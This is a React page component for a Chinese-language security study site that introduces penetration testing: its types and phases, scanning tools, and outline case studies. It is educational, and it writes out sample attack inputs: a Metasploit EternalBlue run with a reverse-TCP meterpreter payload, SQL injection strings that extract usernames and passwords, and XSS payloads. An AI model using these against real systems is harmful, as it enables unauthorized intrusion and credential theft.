'use client';
import { useState } from 'react';
import Link from 'next/link';

export default function PenetrationBasicPage() {
  const [activeTab, setActiveTab] = useState('intro');

  return (
    <div className="container mx-auto px-4 py-8">
      <h1 className="text-3xl font-bold mb-8">渗透测试基础</h1>

      {/* 标签页导航 */}
      <div className="flex space-x-4 mb-6 border-b overflow-x-auto">
        <button
          onClick={() => setActiveTab('intro')}
          className={`px-4 py-2 font-medium whitespace-nowrap ${
            activeTab === 'intro'
              ? 'border-b-2 border-blue-500 text-blue-600'
              : 'text-gray-500 hover:text-gray-700'
          }`}
        >
          基础概念
        </button>
        <button
          onClick={() => setActiveTab('tools')}
          className={`px-4 py-2 font-medium whitespace-nowrap ${
            activeTab === 'tools'
              ? 'border-b-2 border-blue-500 text-blue-600'
              : 'text-gray-500 hover:text-gray-700'
          }`}
        >
          工具使用
        </button>
        <button
          onClick={() => setActiveTab('methods')}
          className={`px-4 py-2 font-medium whitespace-nowrap ${
            activeTab === 'methods'
              ? 'border-b-2 border-blue-500 text-blue-600'
              : 'text-gray-500 hover:text-gray-700'
          }`}
        >
          测试方法
        </button>
        <button
          onClick={() => setActiveTab('practice')}
          className={`px-4 py-2 font-medium whitespace-nowrap ${
            activeTab === 'practice'
              ? 'border-b-2 border-blue-500 text-blue-600'
              : 'text-gray-500 hover:text-gray-700'
          }`}
        >
          实践案例
        </button>
      </div>

      {/* 内容区域 */}
      <div className="bg-white rounded-lg shadow-md p-6">
        {activeTab === 'intro' && (
          <div className="space-y-6">
            <h3 className="text-xl font-semibold mb-3">渗透测试基础概念</h3>
            
            <div className="prose max-w-none">
              <h4 className="font-semibold text-lg mb-2">什么是渗透测试？</h4>
              <p className="mb-4">
                渗透测试（Penetration Testing）是一种模拟黑客攻击的安全测试方法，通过模拟真实攻击者的行为，发现系统中存在的安全漏洞和风险。渗透测试的目标是帮助组织发现并修复潜在的安全问题，提高系统的整体安全性。
              </p>

              <h4 className="font-semibold text-lg mb-2">渗透测试的分类</h4>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                <div className="bg-gray-50 p-4 rounded-lg">
                  <h5 className="font-semibold mb-2">1. 黑盒测试</h5>
                  <p className="text-sm text-gray-700">
                    测试人员对目标系统一无所知，完全模拟外部攻击者的视角：
                    <ul className="list-disc pl-6 mt-2">
                      <li>优点：更接近真实攻击场景</li>
                      <li>缺点：测试效率较低</li>
                      <li>适用：外部安全评估</li>
                      <li>特点：需要更多时间进行信息收集</li>
                    </ul>
                  </p>
                </div>

                <div className="bg-gray-50 p-4 rounded-lg">
                  <h5 className="font-semibold mb-2">2. 白盒测试</h5>
                  <p className="text-sm text-gray-700">
                    测试人员拥有目标系统的完整信息：
                    <ul className="list-disc pl-6 mt-2">
                      <li>优点：测试效率高，覆盖全面</li>
                      <li>缺点：可能忽略外部视角的问题</li>
                      <li>适用：内部安全评估</li>
                      <li>特点：可以深入系统内部进行测试</li>
                    </ul>
                  </p>
                </div>

                <div className="bg-gray-50 p-4 rounded-lg">
                  <h5 className="font-semibold mb-2">3. 灰盒测试</h5>
                  <p className="text-sm text-gray-700">
                    测试人员拥有部分系统信息：
                    <ul className="list-disc pl-6 mt-2">
                      <li>优点：平衡效率和真实性</li>
                      <li>缺点：可能遗漏某些特定场景</li>
                      <li>适用：综合安全评估</li>
                      <li>特点：结合黑白盒测试的优点</li>
                    </ul>
                  </p>
                </div>

                <div className="bg-gray-50 p-4 rounded-lg">
                  <h5 className="font-semibold mb-2">4. 红队测试</h5>
                  <p className="text-sm text-gray-700">
                    模拟高级持续性威胁（APT）攻击：
                    <ul className="list-disc pl-6 mt-2">
                      <li>优点：测试真实防御能力</li>
                      <li>缺点：成本高，风险大</li>
                      <li>适用：高级安全评估</li>
                      <li>特点：需要专业的红队团队</li>
                    </ul>
                  </p>
                </div>
              </div>

              {/* SVG图表：渗透测试生命周期 */}
              <div className="my-8">
                <svg width="800" height="400" viewBox="0 0 800 400" className="w-full">
                  <defs>
                    <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="0%">
                      <stop offset="0%" style={{stopColor: '#4F46E5', stopOpacity: 1}} />
                      <stop offset="100%" style={{stopColor: '#7C3AED', stopOpacity: 1}} />
                    </linearGradient>
                    <marker id="arrowhead" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
                      <polygon points="0 0, 10 3.5, 0 7" fill="#4F46E5"/>
                    </marker>
                  </defs>
                  
                  {/* 背景圆环 */}
                  <circle cx="400" cy="200" r="150" fill="none" stroke="#E5E7EB" strokeWidth="2"/>
                  
                  {/* 主要阶段 */}
                  <g transform="translate(400,200)">
                    {/* 信息收集 */}
                    <g transform="rotate(-45)">
                      <rect x="-60" y="-30" width="120" height="60" rx="10" fill="url(#grad1)" opacity="0.9"/>
                      <text x="0" y="5" textAnchor="middle" fill="white" className="text-sm font-medium">信息收集</text>
                    </g>
                    
                    {/* 漏洞扫描 */}
                    <g transform="rotate(45)">
                      <rect x="-60" y="-30" width="120" height="60" rx="10" fill="url(#grad1)" opacity="0.9"/>
                      <text x="0" y="5" textAnchor="middle" fill="white" className="text-sm font-medium">漏洞扫描</text>
                    </g>
                    
                    {/* 漏洞利用 */}
                    <g transform="rotate(135)">
                      <rect x="-60" y="-30" width="120" height="60" rx="10" fill="url(#grad1)" opacity="0.9"/>
                      <text x="0" y="5" textAnchor="middle" fill="white" className="text-sm font-medium">漏洞利用</text>
                    </g>
                    
                    {/* 后渗透测试 */}
                    <g transform="rotate(225)">
                      <rect x="-60" y="-30" width="120" height="60" rx="10" fill="url(#grad1)" opacity="0.9"/>
                      <text x="0" y="5" textAnchor="middle" fill="white" className="text-sm font-medium">后渗透测试</text>
                    </g>
                  </g>
                  
                  {/* 连接箭头 */}
                  <path d="M 400 50 L 400 350" stroke="#4F46E5" strokeWidth="2" markerEnd="url(#arrowhead)"/>
                  <path d="M 50 200 L 750 200" stroke="#4F46E5" strokeWidth="2" markerEnd="url(#arrowhead)"/>
                  
                  {/* 中心点 */}
                  <circle cx="400" cy="200" r="10" fill="#4F46E5"/>
                </svg>
              </div>

              <h4 className="font-semibold text-lg mb-2">渗透测试的基本流程</h4>
              <div className="space-y-4">
                <div className="bg-gray-50 p-4 rounded-lg">
                  <h5 className="font-semibold mb-2">1. 前期准备</h5>
                  <p className="text-sm text-gray-700">
                    <ul className="list-disc pl-6 mt-2">
                      <li>确定测试范围和目标</li>
                      <li>制定测试计划和时间表</li>
                      <li>准备测试环境和工具</li>
                      <li>获取必要的授权和许可</li>
                    </ul>
                  </p>
                </div>

                <div className="bg-gray-50 p-4 rounded-lg">
                  <h5 className="font-semibold mb-2">2. 信息收集</h5>
                  <p className="text-sm text-gray-700">
                    <ul className="list-disc pl-6 mt-2">
                      <li>域名信息收集（WHOIS、DNS记录等）</li>
                      <li>子域名枚举</li>
                      <li>端口扫描和服务识别</li>
                      <li>Web应用信息收集</li>
                      <li>社会工程学信息收集</li>
                    </ul>
                  </p>
                </div>

                <div className="bg-gray-50 p-4 rounded-lg">
                  <h5 className="font-semibold mb-2">3. 漏洞扫描</h5>
                  <p className="text-sm text-gray-700">
                    <ul className="list-disc pl-6 mt-2">
                      <li>使用自动化工具进行扫描</li>
                      <li>手动验证发现的漏洞</li>
                      <li>漏洞分类和风险评估</li>
                      <li>编写漏洞报告</li>
                    </ul>
                  </p>
                </div>

                <div className="bg-gray-50 p-4 rounded-lg">
                  <h5 className="font-semibold mb-2">4. 漏洞利用</h5>
                  <p className="text-sm text-gray-700">
                    <ul className="list-disc pl-6 mt-2">
                      <li>选择合适的攻击向量</li>
                      <li>编写或使用漏洞利用代码</li>
                      <li>获取系统访问权限</li>
                      <li>权限提升和横向移动</li>
                    </ul>
                  </p>
                </div>

                <div className="bg-gray-50 p-4 rounded-lg">
                  <h5 className="font-semibold mb-2">5. 后渗透测试</h5>
                  <p className="text-sm text-gray-700">
                    <ul className="list-disc pl-6 mt-2">
                      <li>维持访问权限</li>
                      <li>收集敏感信息</li>
                      <li>内网渗透测试</li>
                      <li>清理痕迹</li>
                    </ul>
                  </p>
                </div>

                <div className="bg-gray-50 p-4 rounded-lg">
                  <h5 className="font-semibold mb-2">6. 报告编写</h5>
                  <p className="text-sm text-gray-700">
                    <ul className="list-disc pl-6 mt-2">
                      <li>漏洞详细描述</li>
                      <li>风险评估和影响分析</li>
                      <li>修复建议</li>
                      <li>测试过程记录</li>
                    </ul>
                  </p>
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'tools' && (
          <div className="space-y-6">
            <h3 className="text-xl font-semibold mb-3">渗透测试工具使用</h3>

            <div className="space-y-4">
              <div className="bg-gray-50 p-4 rounded-lg">
                <h4 className="font-semibold mb-2">1. 信息收集工具</h4>
                <div className="space-y-2">
                  <p className="text-sm text-gray-700">
                    <b>Nmap：</b>网络扫描和主机发现工具
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# 基本扫描
nmap 192.168.1.1

# 详细扫描
nmap -sV -sC -p- 192.168.1.1

# 操作系统检测
nmap -O 192.168.1.1

# 脚本扫描
nmap --script vuln 192.168.1.1`}</code>
                    </pre>
                  </p>

                  <p className="text-sm text-gray-700">
                    <b>Whois：</b>域名信息查询工具
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# 查询域名信息
whois example.com

# 查询IP信息
whois 192.168.1.1`}</code>
                    </pre>
                  </p>
                </div>
              </div>

              <div className="bg-gray-50 p-4 rounded-lg">
                <h4 className="font-semibold mb-2">2. 漏洞扫描工具</h4>
                <div className="space-y-2">
                  <p className="text-sm text-gray-700">
                    <b>Nessus：</b>商业漏洞扫描器
                    <ul className="list-disc pl-6 mt-2">
                      <li>支持多种漏洞检测</li>
                      <li>提供详细的漏洞报告</li>
                      <li>支持自定义扫描策略</li>
                    </ul>
                  </p>

                  <p className="text-sm text-gray-700">
                    <b>OpenVAS：</b>开源漏洞扫描器
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# 启动OpenVAS
openvas-setup
openvas-start

# 创建扫描任务
omp -u admin -w admin --create-target --name "Target" --hosts 192.168.1.1
omp -u admin -w admin --create-task --name "Scan" --target "Target" --config "Full and fast"`}</code>
                    </pre>
                  </p>
                </div>
              </div>

              <div className="bg-gray-50 p-4 rounded-lg">
                <h4 className="font-semibold mb-2">3. Web应用测试工具</h4>
                <div className="space-y-2">
                  <p className="text-sm text-gray-700">
                    <b>Burp Suite：</b>Web应用测试平台
                    <ul className="list-disc pl-6 mt-2">
                      <li>代理拦截和修改请求</li>
                      <li>漏洞扫描</li>
                      <li>自动化测试</li>
                      <li>API测试</li>
                    </ul>
                  </p>

                  <p className="text-sm text-gray-700">
                    <b>OWASP ZAP：</b>开源Web应用扫描器
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# 启动ZAP
zap.sh

# 命令行扫描
zap-cli quick-scan --self-contained --start-options "-config api.disablekey=true" http://example.com`}</code>
                    </pre>
                  </p>
                </div>
              </div>

              <div className="bg-gray-50 p-4 rounded-lg">
                <h4 className="font-semibold mb-2">4. 漏洞利用框架</h4>
                <div className="space-y-2">
                  <p className="text-sm text-gray-700">
                    <b>Metasploit：</b>渗透测试框架
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# 启动Metasploit
msfconsole

# 搜索漏洞利用模块
msf > search type:exploit platform:windows

# 使用漏洞利用模块
msf > use exploit/windows/smb/ms17_010_eternalblue
msf > set RHOSTS 192.168.1.1
msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf > set LHOST 192.168.1.100
msf > exploit`}</code>
                    </pre>
                  </p>
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'methods' && (
          <div className="space-y-6">
            <h3 className="text-xl font-semibold mb-3">渗透测试方法</h3>

            <div className="space-y-4">
              <div className="bg-gray-50 p-4 rounded-lg">
                <h4 className="font-semibold mb-2">1. Web应用测试</h4>
                <div className="space-y-2">
                  <p className="text-sm text-gray-700">
                    <b>SQL注入测试：</b>
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# 基本SQL注入测试
' OR '1'='1
' OR '1'='1' --
' UNION SELECT 1,2,3 --
' UNION SELECT username,password,3 FROM users --`}</code>
                    </pre>
                  </p>

                  <p className="text-sm text-gray-700">
                    <b>XSS测试：</b>
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# 反射型XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
javascript:alert('XSS')

# 存储型XSS
<svg onload=alert('XSS')>
<body onload=alert('XSS')>`}</code>
                    </pre>
                  </p>
                </div>
              </div>

              <div className="bg-gray-50 p-4 rounded-lg">
                <h4 className="font-semibold mb-2">2. 网络渗透测试</h4>
                <div className="space-y-2">
                  <p className="text-sm text-gray-700">
                    <b>端口扫描：</b>
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# TCP SYN扫描
nmap -sS 192.168.1.1

# TCP连接扫描
nmap -sT 192.168.1.1

# UDP扫描
nmap -sU 192.168.1.1`}</code>
                    </pre>
                  </p>

                  <p className="text-sm text-gray-700">
                    <b>服务识别：</b>
                    <pre className="bg-gray-100 text-gray-800 p-4 rounded-lg overflow-x-auto mt-2">
                      <code>{`# 版本检测
nmap -sV 192.168.1.1

# 操作系统检测
nmap -O 192.168.1.1

# 脚本扫描
nmap --script vuln 192.168.1.1`}</code>
                    </pre>
                  </p>
                </div>
              </div>

              <div className="bg-gray-50 p-4 rounded-lg">
                <h4 className="font-semibold mb-2">3. 社会工程学测试</h4>
                <div className="space-y-2">
                  <p className="text-sm text-gray-700">
                    <b>钓鱼邮件测试：</b>
                    <ul className="list-disc pl-6 mt-2">
                      <li>制作钓鱼邮件模板</li>
                      <li>设置钓鱼网站</li>
                      <li>发送测试邮件</li>
                      <li>收集用户响应</li>
                    </ul>
                  </p>

                  <p className="text-sm text-gray-700">
                    <b>电话测试：</b>
                    <ul className="list-disc pl-6 mt-2">
                      <li>准备测试脚本</li>
                      <li>模拟紧急情况</li>
                      <li>测试信息泄露</li>
                      <li>评估安全意识</li>
                    </ul>
                  </p>
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'practice' && (
          <div className="space-y-6">
            <h3 className="text-xl font-semibold mb-3">渗透测试实践案例</h3>

            <div className="space-y-4">
              <div className="bg-gray-50 p-4 rounded-lg">
                <h4 className="font-semibold mb-2">案例1：Web应用渗透测试</h4>
                <div className="space-y-2">
                  <p className="text-sm text-gray-700">
                    <b>目标：</b>某电商网站
                  </p>
                  <p className="text-sm text-gray-700">
                    <b>测试步骤：</b>
                    <ol className="list-decimal pl-6 mt-2">
                      <li>信息收集
                        <ul className="list-disc pl-6 mt-1">
                          <li>域名信息收集</li>
                          <li>子域名枚举</li>
                          <li>目录扫描</li>
                        </ul>
                      </li>
                      <li>漏洞扫描
                        <ul className="list-disc pl-6 mt-1">
                          <li>使用OWASP ZAP进行扫描</li>
                          <li>手动验证发现的漏洞</li>
                        </ul>
                      </li>
                      <li>漏洞利用
                        <ul className="list-disc pl-6 mt-1">
                          <li>SQL注入测试</li>
                          <li>XSS测试</li>
                          <li>CSRF测试</li>
                        </ul>
                      </li>
                      <li>报告编写
                        <ul className="list-disc pl-6 mt-1">
                          <li>漏洞描述</li>
                          <li>复现步骤</li>
                          <li>修复建议</li>
                        </ul>
                      </li>
                    </ol>
                  </p>
                </div>
              </div>

              <div className="bg-gray-50 p-4 rounded-lg">
                <h4 className="font-semibold mb-2">案例2：内网渗透测试</h4>
                <div className="space-y-2">
                  <p className="text-sm text-gray-700">
                    <b>目标：</b>企业内部网络
                  </p>
                  <p className="text-sm text-gray-700">
                    <b>测试步骤：</b>
                    <ol className="list-decimal pl-6 mt-2">
                      <li>信息收集
                        <ul className="list-disc pl-6 mt-1">
                          <li>网络拓扑发现</li>
                          <li>主机扫描</li>
                          <li>服务识别</li>
                        </ul>
                      </li>
                      <li>漏洞利用
                        <ul className="list-disc pl-6 mt-1">
                          <li>使用Metasploit进行漏洞利用</li>
                          <li>获取初始访问权限</li>
                        </ul>
                      </li>
                      <li>权限提升
                        <ul className="list-disc pl-6 mt-1">
                          <li>本地提权</li>
                          <li>域内提权</li>
                        </ul>
                      </li>
                      <li>横向移动
                        <ul className="list-disc pl-6 mt-1">
                          <li>内网主机扫描</li>
                          <li>密码哈希获取</li>
                          <li>远程命令执行</li>
                        </ul>
                      </li>
                    </ol>
                  </p>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* 底部导航 */}
      <div className="mt-8 flex justify-between">
        <Link 
          href="/study/security/penetration"
          className="px-4 py-2 text-blue-600 hover:text-blue-800"
        >
          ← 返回渗透测试
        </Link>
        <Link 
          href="/study/security/penetration/recon"
          className="px-4 py-2 text-blue-600 hover:text-blue-800"
        >
          信息收集 →
        </Link>
      </div>
    </div>
  );
} 